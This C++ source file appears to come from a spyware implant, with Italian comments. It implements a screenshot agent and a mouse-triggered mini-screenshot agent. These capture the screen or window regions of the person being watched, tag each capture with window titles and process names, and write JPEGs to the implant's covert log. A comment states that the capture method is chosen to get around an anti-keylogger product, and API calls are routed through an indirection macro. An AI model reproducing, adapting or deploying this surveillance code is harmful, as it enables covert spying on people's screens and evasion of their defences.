#include "H4-DLL.h"
#include "HM_BitmapCommon.h"
#include "common.h"
#include "demo_functions.h"
#include "LOG.h"
#include <gdiplus.h>
using namespace Gdiplus;

BOOL IsAero()
{
	HKEY hKey;
	DWORD composition=0, len=sizeof(DWORD);

	if(FNC(RegOpenKeyExW)(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\DWM", 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
		return FALSE;

	if(FNC(RegQueryValueExW)(hKey, L"Composition", NULL, NULL, (BYTE *)&composition, &len) != ERROR_SUCCESS) {
		FNC(RegCloseKey)(hKey);
		return FALSE;
	} 
	FNC(RegCloseKey)(hKey);

	if (composition==0)
		return FALSE;
	
	return TRUE;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0;          // number of image encoders
   UINT  size = 0;         // size of the image encoder array in bytes

   ImageCodecInfo* pImageCodecInfo = NULL;

   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
   if(pImageCodecInfo == NULL)
      return -1;  // Failure

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j) {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
         free(pImageCodecInfo);
         return j;  // Success
      }    
   }

   free(pImageCodecInfo);
   return -1;  // Failure
}

BYTE *JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
{
	HGLOBAL hBuffer = NULL, hBufferDst = NULL;
	void *pBuffer = NULL, *pBufferDst = NULL;
	IStream *pStream = NULL, *pStreamDst = NULL;
	BYTE *dataptrDst = NULL;
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	CLSID   encoderClsid;
	Image *image = NULL;
	EncoderParameters encoderParameters;

	if (!sizeDst)
		return NULL;
	*sizeDst = 0;

	CoInitialize(NULL);

	if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
		CoUninitialize();
		return NULL;
	}

	if (GetEncoderClsid(L"image/jpeg", &encoderClsid) == -1) {
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
		return NULL;
	}

   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;
   encoderParameters.Parameter[0].Value = &quality;

    hBuffer = GlobalAlloc(GMEM_MOVEABLE, imageSize);
	if (!hBuffer) {
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
		return NULL;
	}

	pBuffer = GlobalLock(hBuffer);
	if (!pBuffer) {
		GlobalFree(hBuffer);
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
		return NULL;
	}

	CopyMemory(pBuffer, dataptr, imageSize);
	
    if (FNC(CreateStreamOnHGlobal)(hBuffer, FALSE, &pStream) == S_OK) {
		image = new Image(pStream);
		if (image) {
			if (hBufferDst = GlobalAlloc(GMEM_MOVEABLE, imageSize)) {
				if (pBufferDst = GlobalLock(hBufferDst)) {
					if (FNC(CreateStreamOnHGlobal)(hBufferDst, FALSE, &pStreamDst) == S_OK) {
						if (image->Save(pStreamDst, &encoderClsid, &encoderParameters) == Ok) {							
							ULARGE_INTEGER position;
							LARGE_INTEGER null_int;
							DWORD dummy;
							null_int.HighPart = null_int.LowPart = 0;
							if (pStreamDst->Seek(null_int, STREAM_SEEK_CUR, &position) == S_OK) {
								if (dataptrDst = (BYTE *)malloc(position.LowPart)) {
									*sizeDst = position.LowPart;
									pStreamDst->Seek(null_int, STREAM_SEEK_SET, &position);
									pStreamDst->Read(dataptrDst, *sizeDst, &dummy);
								}
							}
						}
						pStreamDst->Release();
					}
					GlobalUnlock(hBufferDst);
				}
				GlobalFree(hBufferDst);
			}
			delete image;
		}
		pStream->Release();
	}

	GlobalUnlock(hBuffer);
    GlobalFree(hBuffer);
	GdiplusShutdown(gdiplusToken);
    CoUninitialize();

    return dataptrDst;
}

void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality)
{
	HANDLE hf;
	BITMAPFILEHEADER bmf = { };
	BYTE *source_bmp = NULL, *dest_jpg = NULL;
	DWORD bmp_size, jpg_size;

	if (pBMI->biHeight * pBMI->biWidth * pBMI->biBitCount / 8 != cbData)
		return;

    bmf.bfType = 'MB';
    bmf.bfSize = cbBMI+ cbData + sizeof(bmf); 
    bmf.bfOffBits = sizeof(bmf) + cbBMI; 

	bmp_size = bmf.bfOffBits + cbData;
	if (!(source_bmp = (BYTE *)malloc(bmp_size)))
		return;

	memcpy(source_bmp, &bmf, sizeof(bmf));
	memcpy(source_bmp+sizeof(bmf), pBMI, cbBMI);
	memcpy(source_bmp+sizeof(bmf)+cbBMI, pData, cbData);

	if (dest_jpg = JpgConvert(source_bmp, bmp_size, &jpg_size, quality)) {
		hf = Log_CreateFile(agent_tag, additional_header, additional_len);
		Log_WriteFile(hf, (BYTE *)dest_jpg, jpg_size);
		Log_CloseFile(hf);				
	}
	
	SAFE_FREE(source_bmp);
	SAFE_FREE(dest_jpg);
}

// Esegue uno snpashot dello schermo
// Questa funzione e' usata anche dall'agente URL 
void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality)
{
	HDC hdccap = 0, g_hScrDC = 0;
	HBITMAP hbmcap = 0;
	DWORD g_xscdim, g_yscdim, g_xmirr, g_ymirr, x_start;
	BITMAPINFOHEADER bmiHeader;
	DWORD *pdwFullBits = NULL;
	HGDIOBJ gdiold = 0; 
	BOOL is_aero;
	WINDOWINFO wininfo;
	int winx, winy;

	// Tutto il display. Viene calcolato dalla foreground window
	// per aggirare AdvancedAntiKeylogger
	if (!grabwind)
		if (!(grabwind = GetForegroundWindow()))
			return;

	// Se dobbiamo prendere lo schermo intero su Aero prende il DC dello 
	is_aero = IsAero();
	if (is_aero && !only_window) {
		g_hScrDC = GetDC(NULL);
		wininfo.cbSize = sizeof(wininfo);
		if (!FNC(GetWindowInfo)(FNC(GetDesktopWindow)(), &wininfo)) {
			if (g_hScrDC) ReleaseDC(NULL, g_hScrDC);
			return;
		}
		wininfo.rcClient.left = 0;
		wininfo.rcClient.top = 0;
		wininfo.rcClient.right = GetSystemMetrics(SM_CXSCREEN);
		wininfo.rcClient.bottom = GetSystemMetrics(SM_CYSCREEN);
	} else {
		g_hScrDC = GetDC(grabwind);
		wininfo.cbSize = sizeof(wininfo);
		if (!FNC(GetWindowInfo)(grabwind, &wininfo)) {
			if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
			return;
		}
	}

	if (only_window) {
		//  Clipping per le finestre maximized o che escono dallo schermo
		if (wininfo.rcWindow.left < 0)
			wininfo.rcWindow.left = 0;
		if (wininfo.rcWindow.top < 0)
			wininfo.rcWindow.top = 0;
		if (wininfo.rcWindow.right > GetSystemMetrics(SM_CXSCREEN))
			wininfo.rcWindow.right = GetSystemMetrics(SM_CXSCREEN);			
		if (wininfo.rcWindow.bottom > GetSystemMetrics(SM_CYSCREEN))
			wininfo.rcWindow.bottom = GetSystemMetrics(SM_CYSCREEN);
		if (wininfo.rcWindow.left >= wininfo.rcWindow.right) {
			if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
			return;
		}
		if (wininfo.rcWindow.top >= wininfo.rcWindow.bottom) {
			if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
			return;
		}
			
		g_xscdim = wininfo.rcWindow.right - wininfo.rcWindow.left;
		g_yscdim = wininfo.rcWindow.bottom - wininfo.rcWindow.top;
		g_ymirr = g_yscdim;
		if (wininfo.dwExStyle & WS_EX_LAYOUTRTL) {
			winx = -(wininfo.rcWindow.right - wininfo.rcClient.right);
			winy = -(wininfo.rcClient.top - wininfo.rcWindow.top);;
			x_start = g_xscdim-1;
			g_xmirr = -g_xscdim;			
		} else {
			winx = -(wininfo.rcClient.left - wininfo.rcWindow.left);
			winy = -(wininfo.rcClient.top - wininfo.rcWindow.top);				
			x_start = 0;
			g_xmirr = g_xscdim;
		}
	} else {
		g_xscdim = GetSystemMetrics(SM_CXSCREEN);
		g_yscdim = GetSystemMetrics(SM_CYSCREEN);
		if (wininfo.dwExStyle & WS_EX_LAYOUTRTL) {
			winx = -(g_xscdim - wininfo.rcClient.right);
			winy = -wininfo.rcClient.top;
			x_start = g_xscdim-1;
			g_xmirr = -g_xscdim;
			g_ymirr = g_yscdim;
		} else {
			winx = -wininfo.rcClient.left;
			winy = -wininfo.rcClient.top;
			x_start = 0;
			g_xmirr = g_xscdim;
			g_ymirr = g_yscdim;
		}
	}

	// Alloca la bitmap di dimensione sicuramente superiore a quanto sara' 
	if ( !(pdwFullBits = (DWORD *)malloc(g_xscdim * g_yscdim * sizeof(DWORD))) ) {
		if (is_aero && !only_window) {
			if (g_hScrDC) ReleaseDC(NULL, g_hScrDC);
		} else {
			if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
		}
		return;
	}

	// Settaggi per il capture dello screen
	ZeroMemory(&bmiHeader, sizeof(BITMAPINFOHEADER));
	bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmiHeader.biWidth = g_xscdim;
	bmiHeader.biHeight = g_yscdim;
	bmiHeader.biPlanes = 1;
	bmiHeader.biBitCount = 16;
	bmiHeader.biCompression = BI_RGB;
	bmiHeader.biSizeImage = bmiHeader.biWidth * bmiHeader.biHeight * (bmiHeader.biBitCount/8);

	// Crea un DC memory
	hdccap = CreateCompatibleDC(NULL);
	hbmcap = CreateCompatibleBitmap(g_hScrDC, g_xscdim, g_yscdim);

	// Copia lo schermo nella bitmap
	gdiold = SelectObject(hdccap, hbmcap);
	//BitBlt(hdccap, 0, 0, g_xscdim, g_yscdim, g_hScrDC, -winx, -winy, SRCCOPY);
	StretchBlt(hdccap, x_start, 0, g_xmirr, g_ymirr, g_hScrDC, winx, winy, g_xscdim, g_yscdim, SRCCOPY);
	if (FNC(GetDIBits)(hdccap, hbmcap, 0, g_yscdim, (BYTE *)pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS)) {

		// Prende il titolo della finestra
		WCHAR svTitle[SMLSIZE];
		memset(svTitle, 0, sizeof(svTitle));
		if (HM_SafeGetWindowTextW(grabwind, (LPWSTR)svTitle, SMLSIZE-2) == 0)
			wsprintfW((LPWSTR)svTitle, L"UNKNOWN");

		//Prende il nome della finestra e del processo per scriverlo nell'header
		DWORD dwProcessId = 0;
		WCHAR *proc_name = NULL;
		SnapshotAdditionalData *snap_additional_header;
		BYTE *log_header;
		DWORD additional_len;

		FNC(GetWindowThreadProcessId)(grabwind, &dwProcessId);
		if (!dwProcessId || !(proc_name = HM_FindProcW(dwProcessId))) 
			proc_name = wcsdup(L"UNKNOWN");

		additional_len = sizeof(SnapshotAdditionalData) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
		log_header = (BYTE *)malloc(additional_len);
		if (log_header) {
			// Crea l'header addizionale
			snap_additional_header = (SnapshotAdditionalData *)log_header;
			snap_additional_header->uVersion = LOG_SNAP_VERSION;
			snap_additional_header->uProcessNameLen = wcslen(proc_name)*sizeof(WCHAR);
			snap_additional_header->uWindowNameLen = wcslen(svTitle)*sizeof(WCHAR);
			log_header+=sizeof(SnapshotAdditionalData);
			memcpy(log_header, proc_name, snap_additional_header->uProcessNameLen);
			log_header+=snap_additional_header->uProcessNameLen;
			memcpy(log_header, svTitle, snap_additional_header->uWindowNameLen);

			//Output su file
			BmpToJpgLog(PM_SNAPSHOTAGENT, (BYTE *)snap_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, quality);
			SAFE_FREE(snap_additional_header);
		}
		SAFE_FREE(proc_name);
	}

	// Rilascio oggetti....
	if (gdiold)   DeleteObject(gdiold);
	if (hbmcap)   DeleteObject(hbmcap);
	if (hdccap)   DeleteDC(hdccap);
	if (is_aero && !only_window) {
		if (g_hScrDC) ReleaseDC(NULL, g_hScrDC);
	} else {
		if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
	}
	SAFE_FREE(pdwFullBits);
}


// Esegue uno snpashot di una porzione dello schermo
// Questa funzione e' usata dall'agente MouseLog
void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD g_xscdim, DWORD g_yscdim)
{
	HDC hdccap = 0, g_hScrDC = 0;
	HBITMAP hbmcap = 0;
	DWORD g_xmirr, g_ymirr, x_start;
	BITMAPINFOHEADER bmiHeader;
	DWORD *pdwFullBits = NULL;
	HGDIOBJ gdiold = 0; 
	WINDOWINFO wininfo;
	int winx, winy;
	int abs_x, abs_y;

	DWORD dwProcessId = 0;
	WCHAR *proc_name = NULL;
	MouseAdditionalData *mouse_additional_header; 
	BYTE *log_header;
	DWORD additional_len;

	// Controllo di validita' dei parametri
	if (g_xscdim == 0 || g_yscdim == 0 || 
		xPos > GetSystemMetrics(SM_CXSCREEN) || yPos > GetSystemMetrics(SM_CYSCREEN) ||
		xPos < 0 || yPos < 0)
		return;

	// Le coordinate passate alla funzione sono relative a 
	// questa finestra
	if (!grabwind)
		return;

	g_hScrDC = GetDC(grabwind);
	wininfo.cbSize = sizeof(wininfo);
	if (!FNC(GetWindowInfo)(grabwind, &wininfo)) {
		if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
		return;
	}

	winx = xPos - (g_xscdim/2);
	winy = yPos - (g_yscdim/2);
	if (wininfo.dwExStyle & WS_EX_LAYOUTRTL) {
		abs_x = wininfo.rcClient.right - xPos;
		abs_y = wininfo.rcClient.top + yPos;
		x_start = g_xscdim-1;
		g_xmirr = -g_xscdim;
		g_ymirr = g_yscdim;
	} else {		
		abs_x = wininfo.rcClient.left + xPos;
		abs_y = wininfo.rcClient.top + yPos;
		x_start = 0;
		g_xmirr = g_xscdim;
		g_ymirr = g_yscdim;
	}

	// Alloca la bitmap di dimensione sicuramente superiore a quanto sara' 
	if ( !(pdwFullBits = (DWORD *)malloc(g_xscdim * g_yscdim * sizeof(DWORD))) ) {
		if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
		return;
	}

	// Settaggi per il capture dello screen
	ZeroMemory(&bmiHeader, sizeof(BITMAPINFOHEADER));
	bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmiHeader.biWidth = g_xscdim;
	bmiHeader.biHeight = g_yscdim;
	bmiHeader.biPlanes = 1;
	bmiHeader.biBitCount = 16;
	bmiHeader.biCompression = BI_RGB;
	bmiHeader.biSizeImage = bmiHeader.biWidth * bmiHeader.biHeight * (bmiHeader.biBitCount/8);

	// Crea un DC memory
	hdccap = CreateCompatibleDC(NULL);
	hbmcap = CreateCompatibleBitmap(g_hScrDC, g_xscdim, g_yscdim);

	// Copia lo schermo nella bitmap
	gdiold = SelectObject(hdccap, hbmcap);
	//BitBlt(hdccap, 0, 0, g_xscdim, g_yscdim, g_hScrDC, -winx, -winy, SRCCOPY);
	StretchBlt(hdccap, x_start, 0, g_xmirr, g_ymirr, g_hScrDC, winx, winy, g_xscdim, g_yscdim, SRCCOPY);
	if (FNC(GetDIBits)(hdccap, hbmcap, 0, g_yscdim, (BYTE *)pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS)) {

		// Prende il titolo della finestra
		WCHAR svTitle[SMLSIZE];
		memset(svTitle, 0, sizeof(svTitle));
		if (HM_SafeGetWindowTextW(grabwind, (LPWSTR)svTitle, SMLSIZE-2) == 0)
			wsprintfW((LPWSTR)svTitle, L"UNKNOWN");

		//Prende il nome del processo per scriverlo nell'header
		FNC(GetWindowThreadProcessId)(grabwind, &dwProcessId);
		if (!dwProcessId || !(proc_name = HM_FindProcW(dwProcessId))) 
			proc_name = wcsdup(L"UNKNOWN");

		additional_len = sizeof(MouseAdditionalData) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
		log_header = (BYTE *)malloc(additional_len);
		if (log_header) {
			// Crea l'header addizionale
			mouse_additional_header = (MouseAdditionalData *)log_header;
			mouse_additional_header->uVersion = LOG_MOUSE_VERSION;
			mouse_additional_header->xPos = abs_x;
			mouse_additional_header->yPos = abs_y;
			mouse_additional_header->max_x = GetSystemMetrics(SM_CXSCREEN);
			mouse_additional_header->max_y = GetSystemMetrics(SM_CYSCREEN);
			mouse_additional_header->uProcessNameLen = wcslen(proc_name)*sizeof(WCHAR);
			mouse_additional_header->uWindowNameLen = wcslen(svTitle)*sizeof(WCHAR);
			log_header+=sizeof(MouseAdditionalData);
			memcpy(log_header, proc_name, mouse_additional_header->uProcessNameLen);
			log_header+=mouse_additional_header->uProcessNameLen;
			memcpy(log_header, svTitle, mouse_additional_header->uWindowNameLen);

			//Output su file
			BmpToJpgLog(agent_tag, (BYTE *)mouse_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50);
			SAFE_FREE(mouse_additional_header);
		}
		SAFE_FREE(proc_name);
	}

	// Rilascio oggetti....
	if (gdiold)   DeleteObject(gdiold);
	if (hbmcap)   DeleteObject(hbmcap);
	if (hdccap)   DeleteDC(hdccap);
	if (g_hScrDC) ReleaseDC(grabwind, g_hScrDC);
	SAFE_FREE(pdwFullBits);
}
